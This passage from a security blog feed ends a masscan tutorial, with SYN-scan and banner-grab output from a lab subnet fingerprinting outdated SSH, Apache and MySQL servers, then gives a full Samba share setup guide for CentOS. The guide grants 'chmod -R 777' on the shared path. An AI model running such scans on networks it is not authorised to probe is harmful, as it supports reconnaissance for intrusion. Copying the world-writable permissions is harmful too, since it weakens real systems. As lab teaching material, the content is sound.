</span><span class='line'>Discovered open port 80/tcp on 192.168.217.135                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 8180/tcp on 192.168.217.133                               
</span><span class='line'>Discovered open port 8009/tcp on 192.168.217.133                               
</span><span class='line'>Discovered open port 3306/tcp on 192.168.217.133   </span></code></pre></td></tr></table></div></figure>


<p>The scan was done in a couple of minutes. You might be wondering, how does this tool scan the entire internet in 3 minutes if it took the same length of time for a puny subnet? Well, there are some limitations. To get the most of its speed, you need the proper adapter and driver. Also notice that I rate-limited it to 100k packets per second, because I didn&rsquo;t want my local network to blow up! If you want to benchmark masscan&rsquo;s performance, look on its homepage, under the Performance testing section.</p>

<ul>
<li>grab banners of open ports</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# masscan 192.168.217.0/24 -p22,80,139,445,3306 --banners --source-ip 192.168.217.150 --rate 100000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2017-06-10 09:18:27 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning 256 hosts [5 ports/host]
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.133                                 
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.131                                 
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 139/tcp on 192.168.217.131                                
</span><span class='line'>Discovered open port 22/tcp on 192.168.217.135                                 
</span><span class='line'>Discovered open port 80/tcp on 192.168.217.135                                 
</span><span class='line'>Banner on port 22/tcp on 192.168.217.135: [ssh] SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2
</span><span class='line'>Banner on port 22/tcp on 192.168.217.133: [ssh] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
</span><span class='line'>Banner on port 22/tcp on 192.168.217.131: [ssh] SSH-2.0-OpenSSH_6.6.1          
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.134                                
</span><span class='line'>Discovered open port 445/tcp on 192.168.217.133                                
</span><span class='line'>Discovered open port 3306/tcp on 192.168.217.133                               
</span><span class='line'>Banner on port 3306/tcp on 192.168.217.133: [unknown] \x3e\x00\x00\x00\x0a5.0.51a-3ubuntu5\x00\x07\x00\x00\x00M`yb]-d3\x00,\xaa\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00q^e`0o`r\x3crLb\x00
</span><span class='line'>Banner on port 80/tcp on 192.168.217.131: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:35 GMT\x0d\x0aServer: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips\x0d\x0aLast-Modified: Tue, 02 Aug 2016 13:07:09 GMT\x0d\x0aETag: \x2211-5391664f1e697\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 17\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0a\x0d
</span><span class='line'>Banner on port 80/tcp on 192.168.217.133: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:36 GMT\x0d\x0aServer: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch\x0d\x0aLast-Modified: Wed, 17 Mar 2010 14:08:25 GMT\x0d\x0aETag: \x22107f7-2d-481ffa5ca8840\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 45\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html\x0d\x0a\x0d</span></code></pre></td></tr></table></div></figure>


<p>For this option to work, you have to give masscan its own IP address on the local subnet, something unused by another device. In fact, the recommendation from its homepage is to use it with its separate IP address whenever possible.</p>

<p>And here is how the XML output of the previous scan would look in a spreadsheet:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/masscan-xml.png" title="masscan xml" alt="masscan xml output"></p>

<p>Some other features are:</p>

<ul>
<li><p>output formats in xml, binary, grepable, list, or JSON</p></li>
<li><p>resume scans</p></li>
<li><p>exclude targets</p></li>
<li><p>runs in Linux, Windows, and Mac OS X</p></li>
</ul>


<h3>More resources</h3>

<ul>
<li><p><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html">Robert Graham post on masscan</a></p></li>
<li><p><a href="https://josephpierini.blogspot.com/2016/06/using-masscan-with-top-ports.html">select common ports with Nmap and feed them to Masscan</a></p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Your own qualities will help prevent \
</span><span class='line'>\ your advancement in the world.       /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Quick shares with Samba on CentOS]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos/"/>
    <updated>2017-06-09T05:47:05-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos</id>
    <content type="html"><![CDATA[<p>The interwebz is thundering with doomsday predictions about the <a href="https://blog.qualys.com/securitylabs/2017/05/26/samba-vulnerability-cve-2017-7494">Samba CVE-2017-7494 exploit</a>, and here I am, deciding that now is the best time to make a post on setting up Samba shares! xD</p>

<p>On a related note, if for some reason you can&rsquo;t patch the vulnerability yet, there is a workaround (with some drawbacks). Edit the global section in smb.conf and add the line <code>nt pipe support = no</code>.</p>

<!-- more -->


<p>Back to the matter at hand. First, let&rsquo;s verify if Samba is installed on the CentOS system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q samba
</span><span class='line'>package samba is not installed</span></code></pre></td></tr></table></div></figure>


<p>Since it&rsquo;s not installed on my machine, I installed it with <code>yum install samba</code>, and then ran the previous command again, to check the version:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -q samba
</span><span class='line'>samba-4.4.4-14.el7_3.x86_64</span></code></pre></td></tr></table></div></figure>


<p>Now, let&rsquo;s start Samba and see it running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>service smb start
</span><span class='line'>Redirecting to /bin/systemctl start  smb.service
</span><span class='line'>service smb status
</span><span class='line'>Redirecting to /bin/systemctl status  smb.service
</span><span class='line'>● smb.service - Samba SMB Daemon
</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/smb.service; disabled; vendor preset: disabled)
</span><span class='line'>   Active: active (running) since Thu 2017-06-08 10:56:54 EEST; 5s ago
</span><span class='line'> Main PID: 61874 (smbd)
</span><span class='line'>   Status: "smbd: ready to serve connections..."
</span><span class='line'>   CGroup: /system.slice/smb.service
</span><span class='line'>           ├─61874 /usr/sbin/smbd
</span><span class='line'>           ├─61875 /usr/sbin/smbd
</span><span class='line'>           ├─61876 /usr/sbin/smbd
</span><span class='line'>           └─61879 /usr/sbin/smbd
</span><span class='line'>
</span><span class='line'>Jun 08 10:56:52 localhost.localdomain systemd[1]: Starting Samba SMB Daemon...
</span><span class='line'>Jun 08 10:56:54 localhost.localdomain smbd[61874]: [2017/06/08 10:56:54.513901,  0] ../lib/util/become_daemon.c:124(daemon_ready)
</span><span class='line'>Jun 08 10:56:54 localhost.localdomain smbd[61874]:   STATUS=daemon 'smbd' finished starting up and ready to serve connections
</span><span class='line'>Jun 08 10:56:54 localhost.localdomain systemd[1]: Started Samba SMB Daemon.</span></code></pre></td></tr></table></div></figure>


<h2>Samba daemons</h2>

<p>The Samba functionality is contained within 3 daemons:</p>

<ul>
<li><p><strong>smbd</strong> &ndash; file sharing, printing services, authentication. Default ports are 139 and 445</p></li>
<li><p><strong>nmbd</strong> &ndash; NetBIOS name service requests and browsing protocols</p></li>
<li><p><strong>winbindd</strong> &ndash; used for Windows domains membership</p></li>
</ul>


<h2>Samba configuration</h2>

<p>The Samba configuration file is <code>/etc/samba/smb.conf</code>. Here is how a fresh config file looks after installation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># See smb.conf.example for a more detailed config file or
</span><span class='line'># read the smb.conf manpage.
</span><span class='line'># Run 'testparm' to verify the config is correct after
</span><span class='line'># you modified it.
</span><span class='line'>
</span><span class='line'>[global]
</span><span class='line'>  workgroup = SAMBA
</span><span class='line'>  security = user
</span><span class='line'>
</span><span class='line'>  passdb backend = tdbsam
</span><span class='line'>
</span><span class='line'>  printing = cups
</span><span class='line'>  printcap name = cups
</span><span class='line'>  load printers = yes
</span><span class='line'>  cups options = raw
</span><span class='line'>
</span><span class='line'>[homes]
</span><span class='line'>  comment = Home Directories
</span><span class='line'>  valid users = %S, %D%w%S
</span><span class='line'>  browseable = No
</span><span class='line'>  read only = No
</span><span class='line'>  inherit acls = Yes
</span><span class='line'>
</span><span class='line'>[printers]
</span><span class='line'>  comment = All Printers
</span><span class='line'>  path = /var/tmp
</span><span class='line'>  printable = Yes
</span><span class='line'>  create mask = 0600
</span><span class='line'>  browseable = No
</span><span class='line'>
</span><span class='line'>[print$]
</span><span class='line'>  comment = Printer Drivers
</span><span class='line'>  path = /var/lib/samba/drivers
</span><span class='line'>  write list = root
</span><span class='line'>  create mask = 0664
</span><span class='line'>  directory mask = 0775</span></code></pre></td></tr></table></div></figure>


<p>For much more detailed information and examples, see the <a href="http://chousensha.github.io/downloads/code/smb.conf.example">smb.conf.example file</a></p>

<h2>Create Samba share</h2>

<p>In this example, let&rsquo;s create a share that users can also write to. First, create the directory that you will share: <code>mkdir -p /srv/samba/myshare</code>. I placed a text file with some random stuff inside. Then I gave full access to the path and its subfolders with <code>chmod -R 777 /srv/samba</code></p>

<p>Next, we need to create a Samba user, but this account is not the same as a user account on the system. We have to make a user account on the system before assigning it to Samba:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>adduser smbuser -s /sbin/nologin</span></code></pre></td></tr></table></div></figure>


<p>Here I created a user just for Samba, with no login shell. Attempting to login will give the user a message that they are not allowed to login. If you prefer that the user is disconnected with no message, you can specify <code>/bin/false</code> instead.</p>

<p>Then, I gave the user account a description, which you can find inside <em>/etc/passwd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>usermod -c 'Samba access is allowed for this user' smbuser
</span><span class='line'>[root@localhost ~]# cat /etc/passwd | grep smbuser
</span><span class='line'>smbuser:x:1001:1001:Samba access is allowed for this user:/home/smbuser:/sbin/nologin</span></code></pre></td></tr></table></div></figure>


<p>Have to give the user account a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# passwd smbuser
</span><span class='line'>Changing password for user smbuser.
</span><span class='line'>New password:
</span><span class='line'>Retype new password:
</span><span class='line'>passwd: all authentication tokens updated successfully.</span></code></pre></td></tr></table></div></figure>


<p>Next, we create a Samba user, by using the previously created account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# smbpasswd -a smbuser
</span><span class='line'>New SMB password:
</span><span class='line'>Retype new SMB password:
</span><span class='line'>Added user smbuser.</span></code></pre></td></tr></table></div></figure>


<p>To be safe, check that the Samba user was created:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost ~]# pdbedit -L
</span><span class='line'>smbuser:1001:Samba access is allowed for this user</span></code></pre></td></tr></table></div></figure>


<p>We have the share location and the user, now we need to edit the smb.conf file with the relevant information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[global]
</span><span class='line'>  # workgroup name or Windows NT domain name
</span><span class='line'>  workgroup = SAMBA
</span><span class='line'>  # default: user and password authentication
</span><span class='line'>  security = user
</span><span class='line'>  # optional comment for Windows
</span><span class='line'>  server string = Samba File Server
</span><span class='line'>  # default backend for user information
</span><span class='line'>  passdb backend = tdbsam
</span><span class='line'>
</span><span class='line'>[sharename]
</span><span class='line'>  path = /srv/samba/myshare
</span><span class='line'>  comment = Only authorized users
</span><span class='line'>  # allow these users
</span><span class='line'>  valid users = smbuser
</span><span class='line'>  # same can be achieved with writable = yes
</span><span class='line'>  read only = no  
</span><span class='line'>  # allow subnet range
</span><span class='line'>  allow hosts = 192.168.217.
</span><span class='line'>  # deny access
</span><span class='line'>  invalid users = root  </span></code></pre></td></tr></table></div></figure>


<p>I used comments for easier understanding, but for performance reasons, you might want to keep your file to minimum size, by removing all those comment lines. You can do that by keeping a configuration file with all the additional remarks, while using a smb.conf with only the required configuration. All the comments will be stripped from the config file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@localhost samba]# testparm -s smb.conf.old &gt; smb.conf
</span><span class='line'>Load smb config files from smb.conf.old
</span><span class='line'>rlimit_max: increasing rlimit_max (1024) to minimum Windows limit (16384)
</span><span class='line'>Processing section "[sharename]"
</span><span class='line'>Loaded services file OK.
</span><span class='line'>Server role: ROLE_STANDALONE</span></code></pre></td></tr></table></div></figure>


<p>We checked that our config file is valid, so now it&rsquo;s time to test it. Restart Samba for the configurations to take effect with <code>service smb restart</code>. And now let&rsquo;s access the share! From another machine, I used <strong>smbclient</strong> to list the available services on the Samba server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient -L 192.168.217.131 -U smbuser
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Enter smbuser's password:
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  sharename       Disk      Only authorized users
</span><span class='line'>  IPC$            IPC       IPC Service (Samba File Server)
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  ---------            -------</span></code></pre></td></tr></table></div></figure>


<p>There is one last step that you need to accomplish if you have SELinux enabled. You have to label the directory you&rsquo;re sharing with the <strong>samba_share_t</strong> label:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chcon -R -t samba_share_t /srv/samba</span></code></pre></td></tr></table></div></figure>


<p>Now the /srv/samba directory and everything it contains is labeled correctly, and SELinux won&rsquo;t interfere. View the security context of the path with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -ldZ /srv/samba/
</span><span class='line'>drwxr-xr-x. root root unconfined_u:object_r:samba_share_t:s0 /srv/samba/</span></code></pre></td></tr></table></div></figure>


<p>Changes made with chcon are temporary. To survive a relabel or running <em>restorerecon</em>, make the changes permanent with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage fcontext -a -t samba_share_t "path(/.*)?"</span></code></pre></td></tr></table></div></figure>


<p>Then apply them with <code>restorecon -R -v /path</code>.</p>

<p>Finally, to connect to a share, use the syntax: <code>smbclient  //host/sharename -U username</code> (in the below examle, the name of my share is sharename, because laziness):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient  //192.168.217.131/sharename -U smbuser
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Enter smbuser's password:
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>smb: \&gt; ls
</span><span class='line'>      .                                   D        0  Thu Jun  8 09:39:42 2017
</span><span class='line'>      ..                                  D        0  Thu Jun  8 09:26:38 2017
</span><span class='line'>      read.txt                            N       11  Thu Jun  8 09:39:42 2017
</span><span class='line'>
</span><span class='line'>          18307072 blocks of size 1024. 13091600 blocks available</span></code></pre></td></tr></table></div></figure>


<p>List available commands:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; ?
</span><span class='line'>?              allinfo        altname        archive        backup         
</span><span class='line'>blocksize      cancel         case_sensitive cd             chmod          
</span><span class='line'>chown          close          del            dir            du             
</span><span class='line'>echo           exit           get            getfacl        geteas         
</span><span class='line'>hardlink       help           history        iosize         lcd            
</span><span class='line'>link           lock           lowercase      ls             l              
</span><span class='line'>mask           md             mget           mkdir          more           
</span><span class='line'>mput           newer          notify         open           posix          
</span><span class='line'>posix_encrypt  posix_open     posix_mkdir    posix_rmdir    posix_unlink   
</span><span class='line'>posix_whoami   print          prompt         put            pwd            
</span><span class='line'>q              queue          quit           readlink       rd             
</span><span class='line'>recurse        reget          rename         reput          rm             
</span><span class='line'>rmdir          showacls       setea          setmode        scopy          
</span><span class='line'>stat           symlink        tar            tarmode        timeout        
</span><span class='line'>translate      unlock         volume         vuid           wdel           
</span><span class='line'>logon          listconnect    showconnect    tcon           tdis           
</span><span class='line'>tid            logoff         ..             !              </span></code></pre></td></tr></table></div></figure>


<p>Download file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; get read.txt
</span><span class='line'>getting file \read.txt of size 11 as read.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)</span></code></pre></td></tr></table></div></figure>


<p>Delete file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; del read.txt</span></code></pre></td></tr></table></div></figure>


<p>Upload file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smb: \&gt; put test.png
</span><span class='line'>putting file test.png as \test.png (0.2 kb/s) (average 0.2 kb/s)
</span><span class='line'>smb: \&gt; ls
</span><span class='line'>  .                                   D        0  Thu Jun  8 13:24:14 2017
</span><span class='line'>  ..                                  D        0  Thu Jun  8 09:26:38 2017
</span><span class='line'>  test.png                            A       35  Thu Jun  8 13:22:09 2017
</span><span class='line'>
</span><span class='line'>      18307072 blocks of size 1024. 13091480 blocks available</span></code></pre></td></tr></table></div></figure>


<p>From a Windows system, you can run <code>\192.168.217.131\sharename</code> to connect to the share, or use the <em>net use</em> command.</p>

<p>View shares:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\Documents and Settings\admin&gt;net use
</span><span class='line'>New connections will be remembered.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Status       Local     Remote                    Network
</span><span class='line'>
</span><span class='line'>-------------------------------------------------------------------------------
</span><span class='line'>OK                     \\192.168.217.131\sharename
</span><span class='line'>                                                 Microsoft Windows Network
</span><span class='line'>The command completed successfully.</span></code></pre></td></tr></table></div></figure>


<p>Connect to shares:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\Documents and Settings\admin&gt;net use S: \\192.168.217.131\sharename
</span><span class='line'>The command completed successfully.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>C:\Documents and Settings\admin&gt;s:
</span><span class='line'>
</span><span class='line'>S:\&gt;dir
</span><span class='line'> Volume in drive S is sharename
</span><span class='line'> Volume Serial Number is DCCC-194F
</span><span class='line'>
</span><span class='line'> Directory of S:\
</span><span class='line'>
</span><span class='line'>06/09/2017  02:24 AM    &lt;DIR&gt;          .
</span><span class='line'>06/08/2017  10:26 PM    &lt;DIR&gt;          ..
</span><span class='line'>06/09/2017  02:22 AM                35 test.png
</span><span class='line'>               1 File(s)             35 bytes
</span><span class='line'>               2 Dir(s)  13,405,708,288 bytes free</span></code></pre></td></tr></table></div></figure>


<h3>Other useful options</h3>

<p>You can drill down into the smb.conf file and customize it to your liking. Here are a few options:</p>

<ul>
<li><p>read list = user1, user2 &ndash; set read only users on a writable share</p></li>
<li><p>write list = user1, user2 &ndash; set write access for users on a read only share</p></li>
<li><p>deny hosts  = ip &ndash; deny access to the specified IPs</p></li>
<li><p>hide unreadable = yes &ndash; don&rsquo;t let users see files they don&rsquo;t have access to</p></li>
<li><p>browseable = no &ndash; hide shares from Windows network</p></li>
</ul>


<p>Key takeaways:</p>

<ul>
<li><p>server and share security levels are deprecated, so best to avoid them</p></li>
<li><p>specifying a share in the smb.conf file is not enough. Ensure that you have created the path and gave it sufficient permissins</p></li>
<li><p>Samba users need to already exist on the system</p></li>
<li><p>you can have both a well documented config file and a minimal size one for performance, by using <code>testparm -s</code></p></li>
<li><p>if you use SELinux, don&rsquo;t forget to label your share with <code>samba_share_t</code></p></li>
</ul>


<p>Learn more:</p>

<ul>
<li><p><a href="http://linux-training.be/linuxsrv.pdf">Samba section in Paul Cobbaut&rsquo;s Linux Servers course</a></p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/smb.conf.5.html">smb.conf manpage</a> &ndash; The configuration file for the Samba suite</p></li>
<li><p><a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-samba.html">CentOS Samba guide</a></p></li>
<li><p><a href="smbpasswd%20-%20The%20Samba%20encrypted%20password%20file">smbpasswd man page</a> &ndash; The Samba encrypted password file</p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages/pdbedit.8.html">pdbedit manpage</a> &ndash; manage the SAM database (Database of Samba Users)</p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/testparm.1.html">testparm manpage</a> &ndash; check an smb.conf configuration file for internal correctness</p></li>
<li><p><a href="https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html">smbclient manpage</a> &ndash; ftp-like client to access SMB/CIFS resources on servers</p></li>
</ul>


